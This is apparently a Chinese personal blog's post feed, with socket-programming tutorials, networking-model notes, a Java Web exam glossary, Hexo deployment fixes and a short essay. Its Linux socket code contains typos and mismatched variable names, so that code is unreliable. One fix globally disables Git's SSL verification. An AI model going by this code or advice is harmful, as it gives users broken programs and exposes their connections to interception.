szBuffer);<br><br>    <span class="hljs-comment">//关闭套接字</span><br>    closesocket(sock);<br><br>    <span class="hljs-comment">//终止使用 DLL</span><br>    WSACleanup();<br><br>    system(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>将server.cpp和client.cpp分别编译为server.exe和client.exe，先运行server.exe，再运行client.exe，输出结果为：<br>Message form server：Hello World！</p><p>Windows下的Socket程序和Linux思路相同，但细节有所差别：</p><ul><li><p>Windows下的socket程序依赖Winsock.dll或ws2_32.dll，必须提前加载。DLL有两种加载方式：隐式加载(载入时加载)和显式加载(运行时加载)。</p></li><li><p>Linux使用“文件描述符”的概念，而Windows使用“文件句柄”的概念；Linux不区分socket文件和普通文件，而Windows区分；Linux下socket()函数的返回值为int类型，而Windows下为SOCKET类型，也就是句柄。</p></li><li><p>Linux下使用read()/write()函数读写，而Windows下使用recv()/send()函数发送和接收。</p></li><li><p>关闭socket时，Linux使用close()函数，而Windows使用closesocket()函数</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络编程 </tag>
            
            <tag> socket </tag>
            
            <tag> C语言中文网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>玩转socket（五）</title>
      <link href="/2021/05/04/%E7%8E%A9%E8%BD%ACsocket%EF%BC%88%E4%BA%94%EF%BC%89/"/>
      <url>/2021/05/04/%E7%8E%A9%E8%BD%ACsocket%EF%BC%88%E4%BA%94%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux下的socket演示程序"><a href="#Linux下的socket演示程序" class="headerlink" title="Linux下的socket演示程序"></a>Linux下的socket演示程序</h2><p>本节演示了Linux下的代码，server.cpp是服务器端代码，client.cpp是客户端代码，要实现的功能是：客户端从服务器读取一个字符串并打印出来。</p><p><strong>服务器端代码 server.cpp：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;netinet/in.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-comment">//创建套接字</span><br><span class="hljs-keyword">int</span> serv_sock = socket(AF_INET,SOCK_STREAM,IPPROTP_TCP);<br><br><span class="hljs-comment">//将套接字和IP、端口绑定</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">serv_addr</span>;</span><br><span class="hljs-built_in">memset</span>(&amp;serv_addr,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(serv_addr));<span class="hljs-comment">//每个字节都用0填充</span><br>serv_addr.sin_family = AF_INET;<span class="hljs-comment">//使用IPv4地址</span><br>serv_addr.sin_addr.s_addr = inet_addr(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<span class="hljs-comment">//使用具体IP地址</span><br>serv_addr.sin_port = htons(<span class="hljs-number">1234</span>);<span class="hljs-comment">//端口</span><br>bind(serv_sock,(struct sockaddr*)&amp;serv_addr,<span class="hljs-keyword">sizeof</span>(serv_addr));<br><br><span class="hljs-comment">//进入监听器，等待用户发起请求</span><br>listen(serv_sock,<span class="hljs-number">20</span>);<br><br><span class="hljs-comment">//接收客户端请求</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">clnt_addr</span>;</span><br><span class="hljs-keyword">socklen_t</span> clnt_addr_size = <span class="hljs-keyword">sizeof</span>(clnt_addr);<br><span class="hljs-keyword">int</span> clnt_sock = accept(serv_sock,(struct sockaddr*)&amp;clnt_addr,&amp;clnt_addr_size);<br><br><span class="hljs-comment">//向客户端发送数据</span><br><span class="hljs-keyword">char</span> str[] = <span class="hljs-string">&quot;http://1905060202.github.io&quot;</span>;<br>write(clnt_sock,str,<span class="hljs-keyword">sizeof</span>(str));<br><br><span class="hljs-comment">//关闭套接字</span><br>close(slnt_sock);<br>close(serv_sock);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>客户端代码 client.cpp:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-comment">//创建套接字</span><br><span class="hljs-keyword">int</span> sock = socket(AF_INET,SOCK_STREAM,<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">//向服务器（特定的IP和端口）发起请求</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">servaddr</span>;</span><br><span class="hljs-built_in">memset</span>(&amp;serv_addr,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(serv_addr));<span class="hljs-comment">//每个字节都用0填充</span><br>serv_addr.<span class="hljs-built_in">sin</span>.family = AF_INET;<span class="hljs-comment">//使用IPv4地址</span><br>serv_addr.sin_addr.s_addr = inet_addr(<span class="hljs-string">&quot;127.0.0.1&quot;</span>)<span class="hljs-comment">//具体的IP地址</span><br>serv_addr.sin_port = htons(<span class="hljs-number">1234</span>);<span class="hljs-comment">//端口</span><br>connect(sock,(struct sockaddr*)&amp;serv_addr,<span class="hljs-keyword">sizeof</span>(serv_addr));<br><br><span class="hljs-comment">//读取服务器传回的数据</span><br><span class="hljs-keyword">char</span> buffer[<span class="hljs-number">40</span>];<br>read(sock,buffer,<span class="hljs-keyword">sizeof</span>(buffer)<span class="hljs-number">-1</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Message form server :%s\n&quot;</span>,buffer);<br><br><span class="hljs-comment">//关闭套接字</span><br>close(sock);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>启动一个终端（shell），先编译server.cpp并运行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">[admin@loaclhost ~]$g++server.cpp -o server<br>[admin@localhost ~]$./client<br>Message form server.http:<span class="hljs-comment">//1905060202.github.io</span><br></code></pre></td></tr></table></figure><p>client接收到从server发送过来的字符串就运行结束了，同时server完成发送字符串的任务也运行结束了。大家可以通过两个打开的终端来观察。</p><p>client运行后，通过connect()函数向server发起请求，处于监听状态的server被激活，执行accept()函数，接收客户端的请求，然后执行write()函数向client传回数据。client接收到传回的数据后，connect()函数就运行结束了，然后使用read()将数据读取出来。</p><h3 id="源码解析"><a href="#源码解析" class="headerlink" title="源码解析"></a>源码解析</h3><p><strong>server.cpp：</strong></p><ul><li><p>第11行通过socket()函数创建了一个套接字，参数AF_INET表示使用IPv4地址，SOCK_STREAM表示使用面向连接的套接字，IPPROTP_TCP表示使用TCP协议。在Linux中，socket也是一种文件，有文件描述符，可以使用write()或read()函数进行I/O操作。</p></li><li><p>第19行通过bind()函数将套接字serv_sock与特定的IP地址和端口绑定，IP地址和端口都保存在sockaddr_in结构体中。</p></li><li><p>socket()函数确定了套接字的各种属性，bind()函数让套接字与特定的IP地址和端口对应起来，这样客户端才能连接到该套接字。</p></li><li><p>第22行让套接字处于被动监听的状态。所谓被动监听，是指套接字一直处于“睡眠”状态，直到客户端发起请求才会被“唤醒”</p></li><li><p>第27行的accept()函数用来接收客户端的请求。程序一旦执行到accept()就会被阻塞，直到客户端发起请求。</p></li><li><p>第31行的write()函数用来向套接字文件中写入数据，也就是向客户端发送数据。</p></li></ul><p><strong>client.cpp:</strong></p><ul><li><p>第18行代码通过connect()向服务器发起请求，服务器的IP地址和端口号保存至sockaddr_in结构体中。直到服务器传回数据后，connect()才结束运行。</p></li><li><p>第22行代码通过read()从套接字中读取文件。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络编程 </tag>
            
            <tag> socket </tag>
            
            <tag> C语言中文网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>湖南科大Web期中考试复习参考</title>
      <link href="/2021/04/28/%E6%B9%96%E5%8D%97%E7%A7%91%E5%A4%A7Web%E6%9C%9F%E4%B8%AD%E8%80%83%E8%AF%95%E5%A4%8D%E4%B9%A0%E5%8F%82%E8%80%83/"/>
      <url>/2021/04/28/%E6%B9%96%E5%8D%97%E7%A7%91%E5%A4%A7Web%E6%9C%9F%E4%B8%AD%E8%80%83%E8%AF%95%E5%A4%8D%E4%B9%A0%E5%8F%82%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><ul><li>Socket：套接字，网络上的两个程序通过一个双向的通信连接实现数据的交换，这个连接的一端称为一个Socket</li><li>JVM：Java虚拟机是运行所有Java程序的抽象计算机，是Java语言的运行环境。</li><li>Web：web是分布在全世界的、基于HTTP通信协议的、存储在web服务器中的所有互相连接的超文本集</li><li>C/S：Clien/Sever或客户/服务器模式</li><li>B/S：将web浏览器/web服务器工作模式简称为B/S</li><li>HTTP：超文本传输协议，是专门为web设计的一种网络通信协议</li><li>Html：超级文本标记语言是标准通用标记语言下的一个应用，也是一种规范，一种标准，它通过标记符号来标记要显示的网页中的各个部分</li><li>JS：JavaScript是一种嵌入在HTML文档中，具有跨平台、安全性，基于对象和事件驱动的解释型编程脚本语言</li><li>CSS：级联样式表是一种用来表现HTML或XML等文件样式的计算机语言</li><li>JSP：一种运行在服务器端的脚本语言</li><li>Tomcat：Tomcat服务器是一个免费的开放源码的Web应用服务器，属于轻量级应用服务器</li><li>ODBC：开放数据库连接是微软公司开放服务结构中有关数据库的一个组成部分，它建立了一组规范，并提供了一组对数据库访问的标准API</li><li>JDBC：JDBC是一种访问数据库的技术标准，它是一种能通过Java语言访问数据库的应用程序接口，由一组用Java语言编写的类和接口组成。</li><li>JavaBean：JavaBean是Java Web程序的重要组成部分，是一个可以重复使用的软件组件，是一个遵循特定写法的Java类，它封装了数据和业务逻辑，供JSP或Servlet调用，完成数据封装和数据处理功能</li><li>Servlet：Servlet是用Java语言编写的服务器端程序，它担当客户请求与服务器响应的中间层，属于JavaEE中间层技术，是由服务器端调用和执行，可以处理客户端传来的HTTP请求，并返回一个响应</li><li>XML：可扩展标记语言，标准通用标记语言的子集，是一种用于标记电子文件使其具有结构性的标记语言</li><li>Struts2：Struts2是Apache软件组织的一项开放源码项目，它是对经典设计模式MVC的一种实现，并且是基于webwork核心思想的一种全新架构</li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 习题 </tag>
            
            <tag> Java Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>玩转socket（四）</title>
      <link href="/2021/04/27/%E7%8E%A9%E8%BD%ACsocket%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
      <url>/2021/04/27/%E7%8E%A9%E8%BD%ACsocket%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="OSI网络七层模型、TCP-IP协议族、IP、MAC和端口号"><a href="#OSI网络七层模型、TCP-IP协议族、IP、MAC和端口号" class="headerlink" title="OSI网络七层模型、TCP/IP协议族、IP、MAC和端口号"></a>OSI网络七层模型、TCP/IP协议族、IP、MAC和端口号</h2><p>本讲分三个部分：</p><ul><li><strong>OSI网络七层模型</strong></li><li><strong>TCP/IP协议族</strong></li><li><strong>IP、MAC和端口号</strong></li></ul><h3 id="OSI网络七层模型"><a href="#OSI网络七层模型" class="headerlink" title="OSI网络七层模型"></a>OSI网络七层模型</h3><p>如果你读过计算机专业，或者学习过网络通信（很遗憾，我的专业教学越过了网络通信），那你一定听说过OSI模型，它曾无数次让你头大。OSI是Open System Interconnection的缩写，译为“开放式系统互联”。</p><p>OSI模型把网络通信的工作分为七层，<strong>从下到上</strong>分别是物理层、数据链路层、网络层、传输层、会话层、表示层和应用层。</p><p>OSI只是存在于概念和理论上的一种模型，它的缺点是分层太多，增加了网络工作的复杂性，所以没有大规模应用。后来人们对OSI进行了简化，合并了一些层，最终只保留了4层，<strong>从下到上</strong>分别是接口层、网络层、传输层和应用层。这就是鼎鼎大名的TCP/IP模型。<br><img src="/images/socket/TCP.jpg"><br>图1：OSI 七层网络模型和 TCP/IP 四层网络模型的对比<br><img src="/images/socket/tcp_ip.png"><br>图2：OSI 七层网络模型和 TCP/IP 四层网络模型的对比</p><p><font color=red> 这个网络模型究竟是干什么的呢？简而言之就是进行数据封装的。 </font></p><p>我们平常使用的程序（或者说软件）一般都是通过应用层来访问网络的，程序产生的数据会一层一层地往下传输，直到最后的网络接口层，就通过网线发送到互联网上去了。数据每往下走一层，就会被这一层地协议增加一层包装，等到发送到互联网上时，已经比原始数据多了四层包装。整个数据封装的过程就像俄罗斯套娃。</p><p>当另一台计算机接收到数据包时，会从网络接口再一层一层往上传输，每传输一层就拆开一层包装，直到最后的应用层，就得到了最原始的数据，这才是程序要使用的数据。</p><p>给数据加包装的过程，实际上就是在数据头增加一个标志（一个数据块），表示数据经过了这一层，我已经处理了。给数据拆包的过程正好相反，就是去掉数据头部的标志，让它逐渐现出原形。</p><p>所以，在互联网上传输一份数据是多么的复杂！而我们却感受不到，这就是网络模型的厉害之处。我们只需要在代码中调用一个函数，就能让下面的所有网络层为我们工作。</p><p><font color = red> 我们所说的socket编程，是站在传输层的基础上，所以可以使用TCP/UDP协议，但是不能干访问网页这样的事情，因为访问网页所需要的http协议位于应用层。 </font></p><p>两台计算机进行通信时，必须遵循以下原则：</p><ul><li>必须是同一层次进行通信，比如，A计算机的应用层和B计算机的传输层就不能通信，因为它们不在一个层次，数据的拆包会遇到问题。</li><li>每一层的功能都必须相同，也就是拥有完全相同的网络模型。如果网络模型都不同，那不就乱套了，谁都不认识谁。</li><li>数据只能逐层传输，不能跃层。</li><li>每一层可以使用下层提供的服务，并向上层提供服务。</li></ul><h3 id="TCP-IP协议族"><a href="#TCP-IP协议族" class="headerlink" title="TCP/IP协议族"></a>TCP/IP协议族</h3><p>上面讲到，目前实际使用的网络模型时TCP/IP模型，它对OSI模型进行了简化，只包含了四层，<strong>从上到下</strong>分别是应用层、传输层、网络层和网络接口层，每一层都包含了若干协议。</p><p>协议(Protocol)就是网络通信过程中的约定或者合同，通信双方必须都遵循才能正常收发数据。协议有很多种，例如TCP、UDP、IP等，通信双方必须使用同一协议才能通信。协议是一种规范，由计算机组织制定，规定了很多细节，例如，如何建立连接，如何相互识别等。</p><blockquote><p>协议仅仅是一种规范，必须由计算机软件来实现。例如IP协议规定了如何找到目标计算机，那么各个开发商在开发自己的软件时就必须遵循该协议，不能另起炉灶。</p></blockquote><p>TCP/IP模型包含了TCP、IP、UDP、Telnet、FTP、SMTP等上百种互为关联的协议，其中TCP和IP是最常见的两种底层协议，所以把他们统称为“TCP/IP协议族”</p><p>也就是说，“TCP/IP”模型”中所涉及到的协议称为“TCP/IP协议族”，你可以区分这两个概念，也可以认为他们是等价的，随便你怎么想。</p><p>本文所讲的socket编程是基于TCP和UDP协议的，他们的层级关系如下：</p><p><img src="/images/socket/%E5%B1%82%E7%BA%A7%E5%85%B3%E7%B3%BB.png"><br>图3：TCP和UDP协议的层级关系</p><h4 id="开放式系统（Open-System）"><a href="#开放式系统（Open-System）" class="headerlink" title="开放式系统（Open System）"></a>开放式系统（Open System）</h4><p>把协议分成多个层次有哪些优点？协议设计更容易？当然这也足以成为优点之一。但是还有更重要的原因，就是为了通过标准化操作设计成开放式系统。</p><p>标准本身就是对外公开的，会引导更多的人遵守规范。以多个标准为依据设计的系统称为开放式系统，我们学习的TCP/IP协议族也属于其中之一。</p><p>接下来了解一下开放式系统具有哪些优点。</p><p>路由器用来完成IP层的交互任务。某个网络原来使用A公司的路由器，现要将其替换成B公司的，是否可行？这并非难事，并不一定要换成同一公司的同一型号路由器，因为所有生产商都会按照IP层标准制造。</p><p>再举个例子。大家的计算机是否装有网络接口卡，也就是所谓的网卡？尚未安装也无妨，其实很容易买到，因为所有网卡制造商都会遵循链路层的协议标准。这就是开放式系统的优点。</p><p>标注的存在意味着高速的技术发展，这也是开放式系统设计最大的原因所在。实际上，软件工程中的“面向对象”的诞生背景中也有标准化的影子也就是说，标准对于技术发展起着举足轻重的作用。</p><h3 id="IP、MAC和端口号"><a href="#IP、MAC和端口号" class="headerlink" title="IP、MAC和端口号"></a>IP、MAC和端口号</h3><p>在茫茫的互联网汪洋中，要找到一台计算机非常不容易，有三个要素必须具备，它们分别是IP地址、MAC地址和端口号。</p><h4 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h4><p>IP地址是Internet Protocol Address的缩写，译为“网际协议地址”。<br>目前大部分软件使用IPv4地址，但IPv6也正在被人们接受（实际上很多人已经在用IPv6了），尤其是在教育网中，已经大量使用。</p><p>一台计算机可以拥有一个独立的IP地址，一个局域网也可以拥有一个独立的IP地址（对外就好像只有一台计算机）。目前广泛使用的ipv4地址，它的资源是非常有限的，一台计算机一个IP地址是不现实的，往往是一个局域网才拥有一个IP地址。</p><p>在互联网上进行通信时，必须要知道对方的IP地址。实际上数据包中已经附带了IP地址，把数据包发送给路由器后，路由器会根据IP地址找到对方的地理位置，完成一次数据的传递。路由器有非常高效和智能的算法，很快会找到目标计算机。</p><h4 id="MAC地址"><a href="#MAC地址" class="headerlink" title="MAC地址"></a>MAC地址</h4><p>现实情况是，一个局域网往往才能拥有一个独立的IP；换句话说，IP地址只能定位到一个局域网，无法定位到具体的一台计算机。这可怎么办呀？这样也没法通信呀！</p><p>其实，真正能唯一标识一台计算机是MAC地址，每个网卡的MAC地址在全世界都是独一无二的。计算机出厂时，MAC地址已经被写死到网卡里了（当然，通过某些“奇淫巧技”也是可以修改的）。局域网中的路由器/交换机会记录每台计算机的MAC地址。</p><blockquote><p>MAC地址是Media Access Control Address的缩写，直译为“媒体访问控制地址”，也称为局域网地址（LAN Address），以太网地址或物理地址。</p></blockquote><p>数据包中除了会附带IP地址，还会附带对方的MAC地址，当数据包达到局域网以后，路由器/交换机会根据数据包中的MAC地址找到对应的计算机，然后把数据包转交给它；这样就完成了数据的传递。</p><h4 id="端口号"><a href="#端口号" class="headerlink" title="端口号"></a>端口号</h4><p>有了IP地址和MAC地址，虽然可以找到目标计算机，但仍不能进行通信。一台计算机可以同时提供多种网络服务，例如Web服务，FTP服务（文件传输服务）、SMTP服务（邮箱服务）等，仅有IP地址和MAC地址，计算机虽然可以正确地接收到数据包，但是却不知道要将数据包交给哪个网络程序来处理，所以通信失败。</p><p>为了区分不同的网络程序，计算机会为每个网络程序分配一个独一无二的端口号（Port Number），例如，Web服务的端口是80，FTP服务的端口是21，SMTP服务的端口是25.</p><p>端口（Port）是一个虚拟的、逻辑上的概念。可以将端口理解为一道门，数据通过这道门流入流出，每道门有不同的编号，就是端口号。</p><p><img src="/images/socket/%E7%AB%AF%E5%8F%A3.jpg"><br>图4：端口号对应的网络服务</p><p><strong>本节完</strong></p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络编程 </tag>
            
            <tag> socket </tag>
            
            <tag> C语言中文网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo推送出错如何解决？</title>
      <link href="/2021/04/27/hexo%E6%8E%A8%E9%80%81%E5%87%BA%E9%94%99%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%EF%BC%9F/"/>
      <url>/2021/04/27/hexo%E6%8E%A8%E9%80%81%E5%87%BA%E9%94%99%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h3 id="Hexo报错-git-Failed-to-connect-to-github-com-port-443-Timed-out-或-OpenSSL-SSL-read-Connection-was-reset-errno-10054的解决"><a href="#Hexo报错-git-Failed-to-connect-to-github-com-port-443-Timed-out-或-OpenSSL-SSL-read-Connection-was-reset-errno-10054的解决" class="headerlink" title="Hexo报错(git)   Failed to connect to github.com port 443: Timed out 或 OpenSSL SSL_read: Connection was reset, errno 10054的解决"></a>Hexo报错(git)   Failed to connect to github.com port 443: Timed out 或 OpenSSL SSL_read: Connection was reset, errno 10054的解决</h3><h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><p><strong>在使用hexo博客运行 hexo d 出现报错</strong><br><img src="/images/%E6%88%AA%E5%9B%BE/git%E6%8E%A8%E9%80%81%E5%87%BA%E9%94%99.PNG"><br><strong>Time out</strong>,是代理的问题。如果你在科学上网，那么需要设置http代理端口,http.proxy。<br><img src="/images/%E6%88%AA%E5%9B%BE/%E7%AB%AF%E5%8F%A3%E5%8F%B7.PNG"><br>我的代理端口是8787.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">git config --global http.proxy 127.0.0.1:8787<br>git config --global https.proxy 127.0.0.1:8787<br></code></pre></td></tr></table></figure><p>如果之前已有设置，先取消再设置。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">git config --global --unset http.proxy<br>git config --global --unset https.proxy<br></code></pre></td></tr></table></figure><p>设置好之后再hexo d，部署成功！<br><img src="/images/%E6%88%AA%E5%9B%BE/10054%E8%A7%A3%E5%86%B3.PNG"></p><p>如果这种方法不奏效，使用下面的方法再试试。</p><h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h4><p>错误原因可能是网络不稳定，连接超时造成的，如果试了多次还是报错误，建议执行下面的命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git config --global http.sslVerify &quot;false&quot;<br></code></pre></td></tr></table></figure><p>这个命令用来修改设置，解除 SSL 验证。<br><img src="/images/%E6%88%AA%E5%9B%BE/git%E8%A7%A3%E9%99%A4%E5%8D%8F%E8%AE%AE.PNG"><br>如果这个不奏效，可以试试上面的方法！</p><p><strong>以上就是两种错误的解决方案，在实际操作中，可以都尝试着用一下，说不定就柳暗花明了。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Error解决 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>愿理想之火不灭</title>
      <link href="/2021/04/23/%E6%84%BF%E7%90%86%E6%83%B3%E4%B9%8B%E7%81%AB%E4%B8%8D%E7%81%AD/"/>
      <url>/2021/04/23/%E6%84%BF%E7%90%86%E6%83%B3%E4%B9%8B%E7%81%AB%E4%B8%8D%E7%81%AD/</url>
      
        <content type="html"><![CDATA[<h3 id="人生如逆旅，我亦是行人"><a href="#人生如逆旅，我亦是行人" class="headerlink" title="人生如逆旅，我亦是行人"></a>人生如逆旅，我亦是行人</h3><p>一路求学，至今已有十四载春秋。<br>从黑龙江一隅考到湖南，跨越一千多公里的距离，去追寻最纯粹的理想。<br>突破了重重阻碍，才来到你的面前。<br>从最初的迷惘，到逐渐找到方向，我用了两年。<br>七百天的光阴如此短暂，却又如此漫长。<br>短到眨眼间的物是人非，长到侧身时的教材成山。<br>我一路追求完美，却最终妥协于完美。<br>虽然遗憾满程，但心中的火种仍在。<br>也许我无法燎原，但理想之火不灭。</p>]]></content>
      
      
      <categories>
          
          <category> 闲言碎语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>玩转socket（三）</title>
      <link href="/2021/04/21/%E7%8E%A9%E8%BD%ACsocket%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2021/04/21/%E7%8E%A9%E8%BD%ACsocket%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="SOCK-STREAM和SOCK-DGRAM到底有什么区别？"><a href="#SOCK-STREAM和SOCK-DGRAM到底有什么区别？" class="headerlink" title="SOCK_STREAM和SOCK_DGRAM到底有什么区别？"></a>SOCK_STREAM和SOCK_DGRAM到底有什么区别？</h2><p>上一节《套接字有哪些类型》提到，Stream Sockets就是SOCK_STREAM，它基于TCP协议；Datagram Sockets就是SOCK_DGRAM，它基于UDP协议。<br>这给大家造成一种印象，Stream Sockets就是可靠连接，Datagram Sockets就是不可靠通信，实际情况真的如此吗？</p><p>另外，不管哪种数据传输方式，都得通过整个Internet网络的物理线路将数据传出去，从这个层面理解，所有的socket都是有物理连接的，为什么还有无连接的socket呢？</p><p>从字面上理解，Stream Sockets好像有一条管道，它连接发送端和接收端，数据包通过这条管道来传输。当然，两台计算机在通信之前必须先搭建好管道。<br>Datagram Sockets像是无头苍蝇乱撞，数据包从发送端到接收端没有固定的路线，爱怎么走就怎么走，只要能到达就行。每个数据包都比较自私，不和别人分享自己的线路，但是大家都能殊途同归，到达接收端。</p><p><img src="/images/%E7%AE%80%E5%8C%96%E4%BA%92%E8%81%94%E7%BD%91%E6%A8%A1%E5%9E%8B.gif"></p><p>上图是一个简化的互联网模型，H1-&gt;H6表示计算机，A-&gt;E表示路由器，发送端发送的数据必须经过路由器的转发才能达到接收端。</p><p>假设H1要发送若干个数据包给H6，那么有多条路径可以选择，比如：</p><ul><li>路径1：H1–&gt;A–&gt;C–&gt;E–&gt;H6</li><li>路径2：H1–&gt;A–&gt;B–&gt;E–&gt;H6</li><li>路径3：H1–&gt;B–&gt;D–&gt;E–&gt;H6</li><li>路径4：H1–&gt;A–&gt;B–&gt;C–&gt;E–&gt;H6</li><li>路径5：H1–&gt;A–&gt;C–&gt;B–&gt;D–&gt;E–&gt;H6</li></ul><blockquote><p>数据包的传输路径是由路由器根据算法出来的，算法会考虑很多因素，比如网络的拥堵状况、下一个路由器是否忙碌等。</p></blockquote><h3 id="Datagram-Sockets"><a href="#Datagram-Sockets" class="headerlink" title="Datagram Sockets"></a>Datagram Sockets</h3><p>对于Datagram 